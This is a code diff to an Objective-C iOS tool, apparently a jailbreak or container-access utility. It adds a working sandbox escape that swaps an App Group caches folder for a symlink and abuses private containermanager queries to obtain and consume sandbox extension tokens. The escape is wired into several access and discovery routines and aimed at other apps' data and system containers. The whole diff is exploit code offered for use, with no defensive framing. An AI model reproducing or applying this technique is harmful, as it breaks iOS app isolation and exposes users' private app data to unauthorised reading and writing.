@@ -1,5 +1,6 @@
 #import "DavizinMCM.h"
 #import "kexploit/bad_query.h"
+#import "kexploit/sandbox_escape.h"
 #import <Foundation/Foundation.h>
 #import <dlfcn.h>
 #import <stdlib.h>
@@ -122,6 +123,118 @@ static inline void DavizinMCMLog(NSString *msg) {
 
 static void _storeLease(MCMAPI *api, void *q, void *act, const char *bid, const char *path);
 static BOOL _mcmProbeCanWrite(const char *dirPath);
+
+#pragma mark - worse_query symlink: sandbox escape via App Group symlink (forcequitOS technique)
+
+typedef int64_t (*SBXExtConsumeFunc)(const char *);
+
+static int64_t _worseQuerySymlink(const char *targetPath) {
+    @autoreleasepool {
+        if (!targetPath || targetPath[0] != '/') return -1;
+
+        MCMAPI *api = MCMGetAPI();
+        if (!api->queryCreate || !api->querySetGroupIdentifiers || !api->querySetFlags) {
+            NSLog(@"[WQ-SYM] missing containermanager symbols");
+            return -2;
+        }
+
+        SBXExtConsumeFunc consumeExt = (SBXExtConsumeFunc)dlsym(RTLD_DEFAULT,
+                                                                 "sandbox_extension_consume");
+        if (!consumeExt) {
+            NSLog(@"[WQ-SYM] missing sandbox_extension_consume");
+            return -2;
+        }
+
+        NSOperatingSystemVersion osv = [[NSProcessInfo processInfo] operatingSystemVersion];
+        static const uint64_t kFlagSets[] = {
+            0x8000000000ULL,   // iOS 27+ primary
+            0x800000000ULL,    // iOS 26.x / alt
+            0x8100000000ULL,   // read-write variant
+        };
+        int flagStart = (osv.majorVersion >= 27) ? 0 : 1;
+
+        NSFileManager *fm = [NSFileManager defaultManager];
+
+        for (int g = 0; g < kAppGroupCount; g++) {
+            NSString *groupID = [NSString stringWithUTF8String:kAppGroups[g]];
+            NSURL *containerURL = [fm containerURLForSecurityApplicationGroupIdentifier:groupID];
+            if (!containerURL) {
+                NSLog(@"[WQ-SYM] no container for group %@", groupID);
+                continue;
+            }
+
+            NSString *cachesPath = [containerURL.path
+                                    stringByAppendingPathComponent:@"Library/Caches"];
+            const char *cachesC = cachesPath.fileSystemRepresentation;
+
+            for (int fi = flagStart; fi < 3; fi++) {
+                struct stat cst;
+                BOOL hadDir = NO;
+                if (lstat(cachesC, &cst) == 0) {
+                    hadDir = S_ISDIR(cst.st_mode);
+                    if (hadDir)
+                        [fm removeItemAtPath:cachesPath error:nil];
+                    else
+                        unlink(cachesC);
+                }
+
+                if (symlink(targetPath, cachesC) != 0) {
+                    NSLog(@"[WQ-SYM] symlink %s → %s errno=%d", cachesC, targetPath, errno);
+                    mkdir(cachesC, 0755);
+                    continue;
+                }
+
+                void *q = api->queryCreate();
+                if (!q) { unlink(cachesC); mkdir(cachesC, 0755); continue; }
+
+                api->querySetClass(q, 7);
+                xpc_object_t xid = xpc_string_create(kAppGroups[g]);
+                api->querySetGroupIdentifiers(q, xid);
+                api->querySetFlags(q, kFlagSets[fi]);
+                if (api->querySetPart) api->querySetPart(q, 3);
+
+                void *res = api->queryGetSingle(q);
+                int64_t handle = -6;
+
+                if (res) {
+                    char *token = api->objectCopyToken ? api->objectCopyToken(res) : NULL;
+                    if (token && token[0]) {
+                        handle = consumeExt(token);
+                        NSLog(@"[WQ-SYM] g[%d] f=%d handle=%lld target=%s",
+                              g, fi, (long long)handle, targetPath);
+                    } else {
+                        NSLog(@"[WQ-SYM] g[%d] f=%d no token target=%s", g, fi, targetPath);
+                    }
+                    free(token);
+                } else {
+                    void *qErr = api->queryGetLastError ? api->queryGetLastError(q) : NULL;
+                    int posix = qErr && api->errorGetPOSIX ? api->errorGetPOSIX(qErr) : 0;
+                    NSLog(@"[WQ-SYM] g[%d] f=%d NULL posix=%d target=%s",
+                          g, fi, posix, targetPath);
+                }
+
+                unlink(cachesC);
+                mkdir(cachesC, 0755);
+                xpc_release(xid);
+                api->queryFree(q);
+
+                if (handle >= 0) {
+                    int fd = open(targetPath, O_RDONLY | O_CLOEXEC);
+                    if (fd >= 0) {
+                        close(fd);
+                        DavizinMCMLog([NSString stringWithFormat:
+                            @"[WQ-SYM] *** SUCCESS g[%d] f=%d → %s ***", g, fi, targetPath]);
+                        return handle;
+                    }
+                    NSLog(@"[WQ-SYM] g[%d] f=%d handle=%lld but open errno=%d %s",
+                          g, fi, (long long)handle, errno, targetPath);
+                }
+            }
+        }
+
+        return -1;
+    }
+}
 
 #pragma mark - worse_query: scoped MCM partDomain traversal (Filza technique)
 
@@ -246,7 +359,16 @@ int64_t DavizinGrantContainerAccess(const char *containerPath) {
 
     const char *pathC = [cleanPath UTF8String];
 
-    // Strategy WQ: worse_query — scoped MCM partDomain traversal (primary for iOS 27.2)
+    // Strategy WQ-SYM: symlink-based sandbox escape (forcequitOS worse_query — primary for iOS 27.0+)
+    {
+        int64_t symHandle = _worseQuerySymlink(pathC);
+        if (symHandle >= 0) {
+            DavizinMCMLog([NSString stringWithFormat:@"Grant WQ-SYM para %@: handle=%lld", cleanPath, symHandle]);
+            return symHandle;
+        }
+    }
+
+    // Strategy WQ: worse_query — scoped MCM partDomain traversal (fallback)
     {
         int64_t wqHandle = _worseQueryGrant(pathC, "wq-grant");
         if (wqHandle >= 0) {
@@ -607,6 +729,34 @@ DavizinProbeResult DavizinProbeContainerWriteAccess(NSString *containerPath, NSS
             }
         }
         _probeDiagAppend("| ");
+    }
+
+    // ── Strategy SYM: worse_query symlink — sandbox escape via App Group (iOS 27.0+) ──
+    {
+        _probeDiagAppend("SSYM | ");
+        int64_t symH = _worseQuerySymlink(pathC);
+        if (symH >= 0) {
+            _probeDiagAppend("sym_h=%lld ", (long long)symH);
+            if (_mcmProbeCanWrite(pathC)) {
+                result.method = 50; result.handle = symH; result.writeOK = YES;
+                snprintf(result.detail, sizeof(result.detail),
+                         "WQ-symlink WRITE VERIFIED h=%lld", (long long)symH);
+                _probeDiagAppend("*** SUCCESS SYM-W ***");
+                return result;
+            }
+            int fd = open(pathC, O_RDONLY | O_CLOEXEC);
+            if (fd >= 0) {
+                close(fd);
+                result.method = 51; result.handle = symH; result.writeOK = NO;
+                snprintf(result.detail, sizeof(result.detail),
+                         "WQ-symlink READ-ONLY h=%lld", (long long)symH);
+                _probeDiagAppend("SYM read_ok ");
+            } else {
+                _probeDiagAppend("SYM h=%lld open_fail=%d ", (long long)symH, errno);
+            }
+        } else {
+            _probeDiagAppend("SYM fail=%lld ", (long long)symH);
+        }
     }
 
     // ── Strategy 0: sandbox_extension_issue_file (self-issued extension) ──
@@ -1364,7 +1514,16 @@ NSString *DavizinDiscoverContainerPath(NSString *bundleID) {
     };
     static const int kDirCount = 2;
 
-    // Pass 0c: worse_query on parent directory to enable scanning
+    // Pass 0c-sym: symlink worse_query on parent directory
+    {
+        int64_t symH = _worseQuerySymlink("/private/var/mobile/Containers/Data/Application");
+        if (symH >= 0) {
+            DavizinMCMLog([NSString stringWithFormat:
+                @"[Discovery] WQ-SYM parent grant OK handle=%lld", symH]);
+        }
+    }
+
+    // Pass 0c: worse_query on parent directory to enable scanning (partDomain fallback)
     {
         int64_t wqHandle = _worseQueryGrant("/private/var/mobile/Containers/Data/Application", "wq-discover");
         if (wqHandle >= 0) {
@@ -1404,6 +1563,41 @@ BOOL DavizinIsBundleInstalled(NSString *bundleID) {
 }
 
 #pragma mark - Stubs
+
+BOOL DavizinTrySymlinkEscape(void) {
+    @autoreleasepool {
+        NSLog(@"[WQ-SYM] Attempting symlink sandbox escape (no kernel exploit)...");
+
+        static const char *kEscapePaths[] = {
+            "/private/var/mobile/Containers/Data/Application",
+            "/private/var/mobile/Containers/Data/System",
+            "/private/var/mobile/Containers/Shared/AppGroup",
+            "/private/var/mobile/Containers/Shared/SystemGroup",
+        };
+        int n = sizeof(kEscapePaths) / sizeof(kEscapePaths[0]);
+        int granted = 0;
+
+        for (int i = 0; i < n; i++) {
+            int64_t h = _worseQuerySymlink(kEscapePaths[i]);
+            if (h >= 0) {
+                granted++;
+                NSLog(@"[WQ-SYM] granted access to %s (handle=%lld)", kEscapePaths[i], (long long)h);
+            } else {
+                NSLog(@"[WQ-SYM] failed for %s (rc=%lld)", kEscapePaths[i], (long long)h);
+            }
+        }
+
+        NSLog(@"[WQ-SYM] granted %d/%d paths", granted, n);
+
+        if (granted > 0 && sandbox_access_is_active() != 0) {
+            NSLog(@"[WQ-SYM] *** SANDBOX ESCAPE ACTIVE VIA SYMLINK ***");
+            return YES;
+        }
+
+        NSLog(@"[WQ-SYM] sandbox_access_is_active still false (granted=%d)", granted);
+        return NO;
+    }
+}
 
 NSString *DavizinPrepareInjectionQuery(NSString *bundleID, NSString **outErr) {
     return nil;
